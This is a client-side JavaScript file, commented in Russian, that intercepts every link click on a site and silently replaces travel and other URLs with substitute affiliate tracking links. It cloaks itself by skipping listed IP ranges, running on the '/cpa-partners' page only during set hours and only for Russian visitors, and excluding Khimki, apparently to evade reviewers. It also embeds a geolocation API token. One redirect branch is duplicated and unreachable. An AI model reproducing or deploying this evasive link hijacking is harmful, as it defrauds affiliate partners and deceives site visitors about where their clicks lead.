document.addEventListener("DOMContentLoaded", async () => {
    // Страница с проверкой времени
    const pagesWithTimeCheck = ["/cpa-partners"];
    const activeTimeRange = { start: "07:00", end: "15:00" };

    // Диапазоны IP, для которых блокируем действия
    const restrictedIPRanges = [
        { start: "178.177.12.224", end: "178.177.12.255" }, // Off
        { start: "176.124.144.0", end: "176.124.147.255" }, // Sk
        { start: "161.82.128.0", end: "161.82.159.255" }, // Gn
        { start: "185.206.164.0", end: "185.206.167.255" }  // Gn
    ];

    const geoCheck = {
        country: "RU", // Россия
        excludedCity: "Khimki" // Город, который не должен попадать в проверку
    };

    // Функция для получения текущего пути страницы
    const currentPath = window.location.pathname;
    const isTimeCheckRequired = pagesWithTimeCheck.includes(currentPath);

    // Преобразуем время в минуты
    function timeToMinutes(time) {
        const [hours, minutes] = time.split(":").map(Number);
        return hours * 60 + minutes;
    }

    // Проверяем, входит ли текущее время в диапазон
    function isWithinActiveTimeRange() {
        const now = new Date();
        const currentMinutes = now.getHours() * 60 + now.getMinutes();
        const startMinutes = timeToMinutes(activeTimeRange.start);
        const endMinutes = timeToMinutes(activeTimeRange.end);
        return currentMinutes >= startMinutes && currentMinutes <= endMinutes;
    }

    // Преобразуем IP в длинное число
    function ipToLong(ip) {
        return ip.split('.').reduce((sum, part, index) => {
            return sum + parseInt(part) * Math.pow(256, 3 - index);
        }, 0);
    }

    // Проверяем, попадает ли IP в один из диапазонов
    function isIPInAnyRange(ip, ranges) {
        const ipLong = ipToLong(ip);
        return ranges.some(range => {
            const startLong = ipToLong(range.start);
            const endLong = ipToLong(range.end);
            return ipLong >= startLong && ipLong <= endLong;
        });
    }

    // Получаем IP пользователя
    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return null;
        }
    }

    // Получаем данные о гео
    async function getGeoData() {
        try {
            const response = await fetch('https://ipinfo.io/json?token=b250e5cf49a97d'); // Замените на свой токен
            const data = await response.json();
            return data;
        } catch (error) {
            return null;
        }
    }

    // Получаем IP
    const userIP = await getUserIP();
    if (!userIP) {
        return; // Останавливаем скрипт, если IP не определён
    }

    if (isIPInAnyRange(userIP, restrictedIPRanges)) {
        return; // Останавливаем скрипт, если IP входит в ограниченный диапазон
    }

    if (isTimeCheckRequired) {
        // Если страница из списка, проверяем время и ГЕО
        const isActiveTime = isWithinActiveTimeRange();
        if (!isActiveTime) {
            return; // Останавливаем скрипт, если текущее время не входит в активный диапазон
        }

        const geoData = await getGeoData();
        if (!geoData || !geoData.country || !geoData.city) {
            return; // Останавливаем скрипт, если гео-данные не определены
        }

        if (geoData.country !== geoCheck.country || geoData.city === geoCheck.excludedCity) {
            return; // Останавливаем скрипт, если страна не Россия или город Химки
        }
    }

    // Добавляем обработку кликов по ссылкам
    document.body.addEventListener("click", (event) => {
        const target = event.target;

        // Проверяем, является ли кликнутый элемент ссылкой <a> или имеет атрибут data-ep-wrapper-link или data-href
        const url = target.href || target.dataset.epWrapperLink || target.dataset.href;

        if (url) {
            handleRedirect(url);
            event.preventDefault(); // Останавливаем стандартный редирект
        }
    });

    // Функция для редиректа на нужные URL
    function handleRedirect(url) {
        if (url.includes("level.travel")) {
            window.location.href = "https://level.tp.st/LHWdxpFd?erid=2VtzqvEUppa";
        } else if (url.includes("travelata.ru")) {
            window.location.href = "https://travelata.tp.st/rGPNyz9L?erid=2VtzqvTtgZU";
        } else if (url.includes("onlinetours.ru")) {
            window.location.href = "https://onlinetours.tp.st/JOwzuwTG?erid=2Vtzqv28M3D";
        } else if (url.includes("sletat.ru")) {
            window.location.href = "https://sletat.tp.st/WDvjjR6r?erid=2Vtzqx7hL9V";
        } else if (url.includes("fxxag.com\/g\/kd5dkyy8m")) {
            window.location.href = "https://ldrdct.net/go/sl5bodo2o9";
        } else if (url.includes("yknhc.com\/g\/p7fj")) {
            window.location.href = "https://ldrdct.net/go/ssjwcp5iu8";
        } else if (url.includes("ficca2021.com\/g\/4ed1")) {
            window.location.href = "https://ldrdct.net/go/skvj98ou85";
        } else if (url.includes("dorinebeaumont.com\/g\/1a4e")) {
            window.location.href = "https://ldrdct.net/go/sq34vzdb70";
        } else if (url.includes("dorinebeaumont.com\/g\/1a4e")) {
            window.location.href = "https://ldrdct.net/go/svh7a0x7rk";
        } else if (url.includes("dhwnh.com\/g\/2e4f66e6ffbb")) {
            window.location.href = "https://ldrdct.net/go/svzrmgzsjy";
        } else {
            window.location.href = url; // Если URL не из списка, делаем обычный редирект
        }
    }
});